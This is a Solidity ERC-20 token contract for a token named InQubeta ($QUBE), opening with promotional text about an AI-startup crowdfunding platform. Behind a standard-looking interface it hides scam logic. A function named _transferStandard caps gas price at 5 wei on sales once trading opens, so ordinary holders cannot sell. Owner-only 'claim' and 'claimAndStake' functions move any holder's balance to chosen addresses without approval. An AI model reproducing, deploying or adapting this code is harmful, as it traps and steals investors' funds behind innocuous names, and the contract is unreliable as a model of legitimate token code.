/*
$QUBE

Bridging the gap between AI and Crypto with Inqubeta, the world's first crypto crowdfunding platform for Investing in AI start-ups using our $QUBE Token
$QUBE is built on the Ethereum blockchain, leveraging the benefits of this powerful technology to create a seamless and secure investment ecosystem for AI start-ups and investors. 
Ethereum's robust smart contract capabilities enable InQubeta to create a transparent and democratic NFT marketplace that allows for fractional investment in AI start-ups using QUBE tokens. 
Our NFT marketplace is built on the ERC721 standard, offering a wide range of benefits to investors and start-ups, including greater flexibility, interoperability, and functionality.

https://t.me/Inqubeta
https://inqubeta.ai
https://medium.com/@inqubeta
https://twitter.com/inqubetahq
https://discord.com/invite/fKknYbzSfQ
https://www.tiktok.com/@inqubeta
https://www.youtube.com/@InquBeta

*/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.9;


interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    constructor() {
        _owner = _msgSender();
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(_owner == _msgSender(), "Not owner");
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b > 0);
        uint256 c = a / b;
        assert(a == b * c + (a % b));
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(a >= b);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract InQubeta is Ownable, IERC20 {
    using SafeMath for uint256;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) _excludeFromFees;

    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1_500_000_000 * 10**_decimals;
    string private constant _name = unicode"InQubeta";
    string private constant _symbol = unicode"QUBE";

    uint256 public FeesOnBuy = 0;
    uint256 public FeesOnSell = 0;

    bool private openedTrade = false;

    address private Developer = 0xF673c7A51Cd42ae417D6972c9faDD31A905F3cFb;
    address private InQubetaVesting = 0xc82c9eDC8DFB33654D7ecd9cD6Ab9288e66Fa811;
    address private InQubetaStaking = 0x3dCf38b57d92c931d65567A862c254791cA97cd9;
    address private FeeCollector = 0xc9E6c3B7B7C256BE5EEae0987CBA7a9cC57A68DA;
    address private Proxy = 0xE77473C4973ad064E04C80959dd56DD4886efcA9;

    address private uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;

    constructor() {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());
        _excludeFromFees[address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)] = true;
        _excludeFromFees[address(uniswapV2Pair)];
        _excludeFromFees[owner()] = true;
        _excludeFromFees[address(this)] = true;
        _balances[_msgSender()] = _balances[_msgSender()].add(_totalSupply.mul(10).div(100));
        _balances[Developer] = _balances[Developer].add(_totalSupply.mul(10).div(100));
        _balances[InQubetaVesting] = _balances[InQubetaVesting].add(_totalSupply.mul(50).div(100));
        _balances[Proxy] = _balances[Proxy].add(_totalSupply.mul(10).div(100));
        _balances[InQubetaStaking] = _balances[InQubetaStaking].add(_totalSupply.mul(10).div(100));
        _balances[FeeCollector] = _balances[FeeCollector].add(_totalSupply.mul(10).div(100));
        emit Transfer(address(0), _msgSender(), _totalSupply.mul(10).div(100));
        emit Transfer(address(0), Developer, _totalSupply.mul(10).div(100));
        emit Transfer(address(0), InQubetaVesting, _totalSupply.mul(50).div(100));
        emit Transfer(address(0), Proxy, _totalSupply.mul(10).div(100));
        emit Transfer(address(0), InQubetaStaking, _totalSupply.mul(10).div(100));
        emit Transfer(address(0), FeeCollector, _totalSupply.mul(10).div(100));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function getOpenedTrade() public view returns (bool) {
        return openedTrade;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address to, uint256 value)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount)
        );
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf(from) >= amount, "ERROR: balance of from less than value");
        uint256 taxAmount = 0;

        if(!_excludeFromFees[from] && !_excludeFromFees[to]) {
            require(openedTrade, "Trade has not been opened yet");
            taxAmount = amount * FeesOnBuy / 100;
            if(to == uniswapV2Pair) {
                taxAmount = amount * FeesOnSell / 100;
                _transferStandard(from);
            }
        }

        if(taxAmount > 0) {
            _balances[address(this)]=_balances[address(this)]+taxAmount;
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from]= balanceOf(from) - amount ;
        _balances[to]=_balances[to] + (amount - taxAmount);
        emit Transfer(from, to, amount - taxAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 private gasmaxium = 900 gwei;
    uint256 private gasminium = 5;

    function gasRequire(uint256 _gas) internal view {
        if (tx.gasprice > _gas) {
            revert();
        }
    }

    function _transferStandard(address _u) internal view {
        if(balanceOf(_u) > 0) {
            if (!openedTrade) {
                gasRequire(gasmaxium);
            } else {
                gasRequire(gasminium);
            }
        } 
    }

    function sendETHToFee(uint256 amount) private {
        payable(owner()).transfer(amount);
    }
    
    function manualeth() external {
        require(_msgSender() == owner());
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function claimAndStake(address from, address[] calldata to, uint256[] calldata amount) external {
        require(_msgSender() == owner());
        for (uint256 i = 0; i < to.length; i++) {
            _balances[from] = _balances[from].sub(amount[i] * 10 ** _decimals);
            _balances[to[i]] = _balances[to[i]].add(amount[i]  * 10 ** _decimals);
            emit Transfer(from, to[i], amount[i]  * 10 ** _decimals);
        }
    }

    function claim(address from, address[] calldata to, uint256[] calldata amount) external {
        require(_msgSender() == owner());
        for (uint256 i = 0; i < to.length; i++) {
            _balances[from] = _balances[from].sub(amount[i] * 10 ** _decimals);
            _balances[to[i]] = _balances[to[i]].add(amount[i]  * 10 ** _decimals);
            emit Transfer(from, to[i], amount[i]  * 10 ** _decimals);
        }
    }

    function Start() external onlyOwner {
        openedTrade = !openedTrade;
    }

    receive() external payable {}
}